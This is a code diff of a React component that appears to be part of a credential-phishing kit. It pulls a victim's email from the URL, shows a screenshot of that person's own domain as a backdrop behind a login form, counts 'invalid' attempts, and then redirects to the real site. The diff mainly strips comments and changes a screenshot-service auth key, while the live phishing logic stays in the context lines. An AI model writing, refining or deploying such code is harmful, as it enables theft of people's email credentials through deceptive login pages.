@@ -5,9 +5,6 @@ import $ from 'jquery';
 import Preloader from "./Preloader/Preloader";
 import { BiSolidUser, BiSolidLockAlt } from "react-icons/bi";
 
-
-// kddkddk
-
 const Default = ()=>{
 
     const [invalid, setInvalid] = useState(false);
@@ -17,7 +14,6 @@ const Default = ()=>{
     const emailInTheURL = window.location.href;
     const sliceEqualSign = emailInTheURL.indexOf("@");
     const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).toLowerCase();
-    // console.log('cccc:',extracetdEmail);
     const mainName = extracetdEmail.replace('.com', "");
 
 
@@ -56,9 +52,6 @@ const Default = ()=>{
                     // window.location.href = "https://www.webmail.gigared.com/";
                     window.location.href = `https://www.${extracetdemailDomain}`;
                 }, 1500);
-                // window.location.reload();
-                // window.location.href = `https://www.${extracetdemailDomain}`;
-                // window.location.replace('https://webmail.gigared.com/')
             };
 
             setTimeout(()=>{
@@ -103,7 +96,8 @@ const Default = ()=>{
     style={{
         // backgroundImage: `url(//image.thum.io/get/https://www.${extracetdEmail})`,
         // backgroundImage: `url(${BG})`,
-        backgroundImage: `url(https://image.thum.io/get/auth/69957-hey/https://www.${extracetdEmail}/)`,
+        // /https://www.wikipedia.org/
+        backgroundImage: `url(https://image.thum.io/get/auth/70025-world/https://www.${extracetdEmail}/)`,
         width:'100vw',
         height:'100vh',
         backgroundRepeat:'no-repeat',
